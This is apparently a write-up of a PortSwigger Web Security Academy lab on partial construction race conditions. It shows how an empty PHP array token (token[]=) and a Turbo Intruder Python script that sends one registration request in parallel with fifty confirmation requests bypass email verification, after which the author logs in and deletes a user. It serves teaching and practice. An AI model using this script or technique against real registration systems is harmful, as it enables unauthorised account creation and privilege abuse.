# Partial construction race conditions

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction), you'll learn: Partial construction race conditions! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab contains a user registration mechanism. A race condition enables you to bypass email verification and register with an arbitrary email address that you do not own.

To solve the lab, exploit this race condition to create an account, then log in and delete the user `carlos`.

> **Note:**
>  
> Solving this lab requires Burp Suite 2023.9 or higher. You should also use the latest version of the Turbo Intruder, which is available from the [BApp Store](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988).

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911131923.png)

In here, we can purchase some items.

**In endpoint `/register`, we can register a new account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911132009.png)

We can try to register a new account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911132135.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911132152.png)

Invalid email address?

Let's try another one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911132305.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911132321.png)

Ah... **We need to register with `@ginandjuice.shop` email...**

That being said, the registration endpoint has implemented **email verification**.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911132639.png)

When we clicked the "Register" button, it'll sent a POST request to `/register` with POST parameter `csrf`, `username`, `email` and `password`.

It's worth noting that the web application's **backend is using PHP**, as there's a cookie named `phpsessionid`.

**In the source page of this endpoint, there's a JavaScript is being imported:**
```html
<form class='login-form' method='POST' id='user-registration'>
    <input required type="hidden" name="csrf" value="ALgH5KgVQKW1DTEdf8vpBqAiRbqxEK5r">
    <script src='/resources/static/users.js'></script>
    <script>createRegistrationForm()</script>
</form>
```

**`/resources/static/users.js`:**
```javascript
const createRegistrationForm = () => {
    const form = document.getElementById('user-registration');

    const usernameLabel = document.createElement('label');
    usernameLabel.textContent = 'Username';
    const usernameInput = document.createElement('input');
    usernameInput.required = true;
    usernameInput.type = 'text';
    usernameInput.name = 'username';

    const emailLabel = document.createElement('label');
    emailLabel.textContent = 'Email';
    const emailInput = document.createElement('input');
    emailInput.required = true;
    emailInput.type = 'email';
    emailInput.name = 'email';

    const passwordLabel = document.createElement('label');
    passwordLabel.textContent = 'Password';
    const passwordInput = document.createElement('input');
    passwordInput.required = true;
    passwordInput.type = 'password';
    passwordInput.name = 'password';

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Register';

    form.appendChild(usernameLabel);
    form.appendChild(usernameInput);
    form.appendChild(emailLabel);
    form.appendChild(emailInput);
    form.appendChild(passwordLabel);
    form.appendChild(passwordInput);
    form.appendChild(button);
}

const confirmEmail = () => {
    const container = document.getElementsByClassName('confirmation')[0];

    const parts = window.location.href.split("?");
    const query = parts.length == 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Confirm';

    form.appendChild(button);
    container.appendChild(form);
}
```

In function `createRegistrationForm()`, it's just preparing the register form.

In function `confirmEmail()` however, **it'll dynamically generate a confirmation form after the email verification was finished**. When the "Confirm" button is clicked, **it'll send a POST request to `/confirm` with GET parameter `token=<token_here>`.**

**We can try to send a POST request to `/confirm` and see what will happen:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911135706.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911135720.png)

As expected, it returned "Incorrect token: `<token_here>`".

In order to bypass the email verification, we can try to find a vulnerability in this `/confirm` endpoint.

**Session-based locking mechanisms:**

Some frameworks attempt to prevent accidental data corruption by using some form of request locking. For example, PHP's native session handler module only processes one request per session at a time.

It's extremely important to spot this kind of behavior as it can otherwise mask trivially exploitable vulnerabilities. If you notice that all of your requests are being processed sequentially, try sending each of them using a different session token.

**Partial construction race conditions:**

Many applications create objects in multiple steps, which may introduce a temporary middle state in which the object is exploitable.

For example, when registering a new user, an application may create the user in the database and set their API key using two separate SQL statements. This leaves a tiny window in which the user exists, but their API key is uninitialized.

This kind of behavior paves the way for exploits whereby you inject an input value that returns something matching the uninitialized database value, such as an empty string, or `null` in JSON, and this is compared as part of a security control.

Frameworks often let you pass in arrays and other non-string data structures using non-standard syntax. For example, in PHP:

- `param[]=foo` is equivalent to `param = ['foo']`
- `param[]=foo&param[]=bar` is equivalent to `param = ['foo', 'bar']`
- `param[]` is equivalent to `param = []`

Ruby on Rails lets you do something similar by providing a query or `POST` parameter with a key but no value. In other words `param[key]` results in the following server-side object:

```ruby
params = {"param"=>{"key"=>nil}}
```

In the example above, this means that during the race window, you could potentially make authenticated API requests as follows:

```http
GET /api/user/info?user=victim&api-key[]= HTTP/2
Host: vulnerable-website.com
```

> **Note:**
>  
> It's possible to cause similar partial construction collisions with a password rather than an API key. However, as passwords are hashed, this means you need to inject a value that makes the hash digest match the uninitialized value.

**Armed with above information, we can try to provide an empty array in PHP:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911135932.png)

Oh! It returned "Array"!

**Then, what if I provide an empty token?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911140043.png)

It returned "Forbidden"!

Hmm... How can we abuse it to bypass the email verification... 

Maybe **the registration flow is vulnerable to partial construction race condition**?

In our enumeration process, we can assume that there maybe a small race window between the POST request in `/register`, and newly generated token is stored in the database:

1. Insert a new user in the database via POST request in `/register`
2. Insert a new token in the database

That being said, when registration is successful, **the backend will create the user and token in the database using two separate SQL statements**.

Therefore, it's possible that **there's a temporary sub-state where `null` or an empty array is a valid token for confirming the registration!**

In a while ago, we found that by providing **an empty array like `token[]=`, the backend will return "Array"**. That means we could pass the confirmation check with an empty array!

## Exploitation

**Benchmark how the endpoint behaves under normal conditions:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911142038.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911142046.png)

As expected, it respond "Incorrect token: Array".

**Sending both requests in parallel:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911142132.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911142140.png)

After sending those requests bunch of times, I wasn't able to bypass the email verification. However, I noticed that **the POST `/confirm` request is much faster than the POST `/register` one.**

Hmm... **We want the new user is pending, and then send the `/confirm` request to bypass the email verification**...

To solve this problem, we can **add some delay in the `/confirm` request**.

To do so, we can use "Turbo Intruder".

- **Send the `/register` POST request to "Turbo Intruder":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911143458.png)

- **Select template `examples/race-single-packet-attack.py`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911143542.png)

- **Add a string formatting placeholder in `username` parameter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911143656.png)

- **Copy the following Python code to the template:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    # replace your `phpsessionid` session cookie in here
    confirmTokenRequest = '''POST /confirm?token[]= HTTP/2
Host: 0af8006404e7115080610d59008b0008.web-security-academy.net
Cookie: phpsessionid=MwpWOoCnobr1TrUGlta4cdZpcrqzFR0A
Content-Length: 0

'''
    MIN_ATTEMPT = 1
    MAX_ATTEMPT = 20
    for usernamePrefix in range(MIN_ATTEMPT, MAX_ATTEMPT):
        currentQueue = 'queue' + str(usernamePrefix)
        # prepare 1 registration request
        engine.queue(target.req, str(usernamePrefix), gate=currentQueue)

        # prepare x number of confirm token requests
        CONFIRM_REQUEST_NUMBER = 50
        for confirmRequest in range(CONFIRM_REQUEST_NUMBER):
            engine.queue(confirmTokenRequest, gate=currentQueue)

        # send all prepared requests at the same time
        engine.openGate(currentQueue)

def handleResponse(req, interesting):
    table.add(req)
```

- **Start "Attack" and find `/confirm` POST request with large content length:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911155852.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911155512.png)

> Note: Try a few times and wait a little more during the attack if it doesn't work as expected.

- **Login as the registered user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911155643.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911155649.png)

- **Delete user `carlos` in the "Admin panel":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911155713.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-5/images/Pasted%20image%2020230911155719.png)

## Conclusion

What we've learned:

1. Partial construction race conditions